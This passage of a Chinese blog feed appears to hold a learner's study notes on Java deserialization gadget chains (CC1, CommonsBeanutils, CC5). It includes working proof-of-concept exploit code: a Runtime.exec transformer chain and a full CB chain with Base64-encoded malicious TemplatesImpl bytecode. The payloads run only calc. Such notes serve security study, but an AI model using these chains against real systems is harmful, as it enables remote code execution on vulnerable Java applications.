class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">// 这里 key 一定是 下面实例化 AnnotationInvocationHandler 时传入的注解类中存在的属性值</span></span><br><span class="line">        <span class="comment">// 并且这里的值的一定不是属性值的类型</span></span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span>      <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(hashMap, <span class="literal">null</span>, chain);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, transformedMap);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc1.txt&quot;</span>));</span><br><span class="line">            outputStream.writeObject(handler);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc1.txt&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>LazyMap利用动态代理来触发transformer</p>
<p>TransformedMap利用重新setvalue方法触发transformer</p>
<p>在Java 8u71以后，官⽅修改了sun.reflect.annotation.AnnotationInvocationHandler的readObject⽅法。 改动后，不再直接使⽤反序列化得到的Map对象，⽽是新建了⼀个LinkedHashMap对象，并将原来的键值添加进去。所以，后续对 Map的操作都是基于这个新的LinkedHashMap对象，⽽原来我们精⼼构造的Map不再执⾏set或put操作，也就不会触发RCE了。</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>cb链</title>
    <url>/2023/08/10/cb/</url>
    <content><![CDATA[<h2 id="Apache-Commons-Beanutils"><a href="#Apache-Commons-Beanutils" class="headerlink" title="Apache Commons Beanutils"></a>Apache Commons Beanutils</h2><p>它是Apache Common下的⼀个⼯具集下的另⼀个项⽬，提供对普通Java类对象（JavaBean）的⼀些操作⽅法 </p>
<p>至于什么是JavaBean，放一下维基百科的定义，很简单：</p>
<ul>
<li>有一个public的无参数构造函数。</li>
<li>属性可以透过get、set、is（可替代get，用在布尔型属性上）方法或遵循特定命名规则的其他方法访问。</li>
<li>可序列化。</li>
</ul>
<p>第二条说白了就是属性都有访问器和更改器。而commons-beanutils中提供了一个静态方法 <code>PropertyUtils.getProperty</code> ，让使用者可以直接调用任 意<code>JavaBean</code>的<code>getter</code>方法</p>
<p>⼀个简单的JavaBean</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Baicany</span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;baicany&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line"><span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>commons-beanutils:commons-beanutils:1.9.2 </p>
<p>commons-logging:commons-logging:1.2</p>
<p>commons-collections:commons-collections:3.1</p>
<p>JDK 1.8.0_192 </p>
<h2 id="PropertyUtils"><a href="#PropertyUtils" class="headerlink" title="PropertyUtils"></a>PropertyUtils</h2><p>它是对JavaBean进⾏操作的⼯具类，可单独为某个属性进⾏值的操作的⼯具类。它利⽤反射操作Bean的属性</p>
<p>PropertyUtils类下提供了⼀些静态⽅法，以⽅便开发者直接调⽤⼀些getter和setter⽅法： </p>
<ul>
<li>getProperty：返回指定Bean的指定属性的值 </li>
<li>getSimpleProperty：返回指定Bean的指定属性的值</li>
<li>setProperty：设置指定Bean的指定属性的值 </li>
<li>setSimpleProperty：设置指定Bean的指定属性的值</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>  org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cb</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> String _name=<span class="string">&quot;baicany&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> _name;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String _name)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>._name = _name;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        cb p=<span class="keyword">new</span> <span class="title class_">cb</span>();</span><br><span class="line">        p.setName(<span class="string">&quot;Baicany&quot;</span>);</span><br><span class="line">        String name=(String) PropertyUtils.getProperty(p,<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Baicany */</span></span><br></pre></td></tr></table></figure>

<h2 id="BeanComparator"><a href="#BeanComparator" class="headerlink" title="BeanComparator"></a>BeanComparator</h2><p>在cc2的基础上，CommonsBeanutils链寻找了⼀个新的compare进⾏利⽤。在ysoserial中利⽤的是 org.apache.commons.beanutils.BeanComparator.compare⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(T o1, T o2)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.property == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.internalCompare(o1, o2);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty(o1, <span class="built_in">this</span>.property);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> PropertyUtils.getProperty(o2, <span class="built_in">this</span>.property);</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.internalCompare(value1, value2);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;IllegalAccessException: &quot;</span> + var5.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;InvocationTargetException: &quot;</span> + var6.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;NoSuchMethodException: &quot;</span> + var7.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中当 this.property!&#x3D;null 时，会调⽤PropertyUtils.getProperty⽅法 上⾯分析过PropertyUtils.getProperty⽅法，它可以调⽤o1&#x2F;o2对象的this.property变量的getter⽅法 ysoserial中，是通过利⽤PropertyUtils.getProperty来调⽤ _outputProperties 变量的getter⽅法，也就是 TemplatesImpl.getOutputProperties⽅法来加载字节码，以达到rec的⽬的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties();<span class="comment">//后面分析看c2链</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要控制o1&#x2F;o2为TemplatesImpl对象，this.property为 outputProperties 字符串 这样我们就能通过调⽤TemplatesImpl.getOutputProperties⽅法来加载字节码 准备好TemplatesImpl对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="type">byte</span>[] code = Base64.getDecoder().decode(                <span class="string">&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +</span><br><span class="line">                <span class="string">&quot;AA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJhbnNmb3JtAQByKExjb20vc3Vu&quot;</span> +</span><br><span class="line">                <span class="string">&quot;L29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +</span><br><span class="line">                <span class="string">&quot;L3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAbAQCmKExj&quot;</span> +</span><br><span class="line">                <span class="string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9h&quot;</span> +</span><br><span class="line">                <span class="string">&quot;cGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNo&quot;</span> +</span><br><span class="line">                <span class="string">&quot;ZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJj&quot;</span> +</span><br><span class="line">                <span class="string">&quot;ZUZpbGUBAAdpby5qYXZhDAAHAAgHABwMAB0AHgEABGNhbGMMAB8AIAEADGNvbS9sYWdvdS9pbwEA&quot;</span> +</span><br><span class="line">                <span class="string">&quot;QGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0&quot;</span> +</span><br><span class="line">                <span class="string">&quot;VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFu&quot;</span> +</span><br><span class="line">                <span class="string">&quot;L2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApn&quot;</span> +</span><br><span class="line">                <span class="string">&quot;ZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0&quot;</span> +</span><br><span class="line">                <span class="string">&quot;cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAAAuAAIAAQAA&quot;</span> +</span><br><span class="line">                <span class="string">&quot;AA4qtwABuAACEgO2AARXsQAAAAEACgAAAA4AAwAAAAoABAALAA0ADAALAAAABAABAAwAAQANAA4A&quot;</span> +</span><br><span class="line">                <span class="string">&quot;AgAJAAAAGQAAAAMAAAABsQAAAAEACgAAAAYAAQAAAA8ACwAAAAQAAQAPAAEADQAQAAIACQAAABkA&quot;</span> +</span><br><span class="line">                <span class="string">&quot;AAAEAAAAAbEAAAABAAoAAAAGAAEAAAASAAsAAAAEAAEADwABABEAAAACABI=&quot;</span>);</span><br><span class="line">        setFieldValue(mpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        setFieldValue(mpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(mpl,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">		setFieldValue(mpl,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br></pre></td></tr></table></figure>

<p>还需要控制this.property变量 </p>
<p>来看BeanComparator的构造函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">BeanComparator</span><span class="params">(String property)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(property, ComparableComparator.getInstance());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">BeanComparator</span><span class="params">(String property, Comparator&lt;?&gt; comparator)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.setProperty(property);</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.comparator = comparator;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.comparator = ComparableComparator.getInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>准备BeanComparator对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>ysoserial是最后通过反射修改this.property变量的值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>需要利⽤org.apache.commons.beanutils.BeanComparator.compare⽅法</p>
<p>像c2链一样就行了</p>
<p>准备序列化⼊⼝类</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">PriorityQueue<span class="built_in"> queue </span>= new PriorityQueue(2);</span><br><span class="line">queue.<span class="built_in">add</span>(1);</span><br><span class="line">queue.<span class="built_in">add</span>(1);</span><br></pre></td></tr></table></figure>

<p>通过反射修改queue变量，以控制传⼊compare⽅法的o1、o2对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object[] queue_array = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;impl,<span class="number">1</span>&#125;;</span><br><span class="line"><span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">size.set(queue,queue_array);</span><br><span class="line"><span class="type">Field</span> <span class="variable">comparator_field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">comparator_field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">comparator_field.set(queue,comparator);</span><br></pre></td></tr></table></figure>

<p>其实就跟c2差不多</p>
<p>完整poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cb</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(</span><br><span class="line">                <span class="string">&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +</span><br><span class="line">                <span class="string">&quot;AA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJhbnNmb3JtAQByKExjb20vc3Vu&quot;</span> +</span><br><span class="line">                <span class="string">&quot;L29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +</span><br><span class="line">                <span class="string">&quot;L3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAbAQCmKExj&quot;</span> +</span><br><span class="line">                <span class="string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9h&quot;</span> +</span><br><span class="line">                <span class="string">&quot;cGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNo&quot;</span> +</span><br><span class="line">                <span class="string">&quot;ZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJj&quot;</span> +</span><br><span class="line">                <span class="string">&quot;ZUZpbGUBAAdpby5qYXZhDAAHAAgHABwMAB0AHgEABGNhbGMMAB8AIAEADGNvbS9sYWdvdS9pbwEA&quot;</span> +</span><br><span class="line">                <span class="string">&quot;QGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0&quot;</span> +</span><br><span class="line">                <span class="string">&quot;VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFu&quot;</span> +</span><br><span class="line">                <span class="string">&quot;L2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApn&quot;</span> +</span><br><span class="line">                <span class="string">&quot;ZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0&quot;</span> +</span><br><span class="line">                <span class="string">&quot;cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAAAuAAIAAQAA&quot;</span> +</span><br><span class="line">                <span class="string">&quot;AA4qtwABuAACEgO2AARXsQAAAAEACgAAAA4AAwAAAAoABAALAA0ADAALAAAABAABAAwAAQANAA4A&quot;</span> +</span><br><span class="line">                <span class="string">&quot;AgAJAAAAGQAAAAMAAAABsQAAAAEACgAAAAYAAQAAAA8ACwAAAAQAAQAPAAEADQAQAAIACQAAABkA&quot;</span> +</span><br><span class="line">                <span class="string">&quot;AAAEAAAAAbEAAAABAAoAAAAGAAEAAAASAAsAAAAEAAEADwABABEAAAACABI=&quot;</span>);</span><br><span class="line">        setFieldValue(impl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        setFieldValue(impl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(impl,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(impl,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>&lt;&gt;(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        Object[] queue_array = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;impl,<span class="number">1</span>&#125;;</span><br><span class="line">        setFieldValue(queue,<span class="string">&quot;queue&quot;</span>,queue_array);</span><br><span class="line">        setFieldValue(queue,<span class="string">&quot;comparator&quot;</span>,comparator);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cb.txt&quot;</span>));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cb.txt&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>cc链5</title>
    <url>/2023/07/17/cc5/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>早在cc6的学习中，为了重新寻找另⼀条调⽤链来调⽤LazyMap.get⽅法，我们找到了 org.apache.commons.collections.keyvalue.TiedMapEntry类，它的getValue⽅法可以调⽤map.get⽅法。</p>
<p>那时候其实我们发现有3个调用getValue的方法,那时候用的hashcode,这次用的toString而已</p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>我们需要一个类来触发toString函数,于是找到了<code>javax.management.BadAttributeValueExpException</code> 这个类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BadAttributeValueExpException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span> </span><br><span class="line"><span class="comment">//这里你发现了什么</span></span><br></pre></td></tr></table></figure>

<p>这个类，反序列化读取 val，当 <code>System.getSecurityManager() == null</code> 或 valObj 是除了 String 的其他基础类型时会调用 valObj 的 <code>toString()</code> 方法，完成上面 TiedMapEntry 的构造。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">            val = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>默认情况下System.getSecurityManager()为null</p>
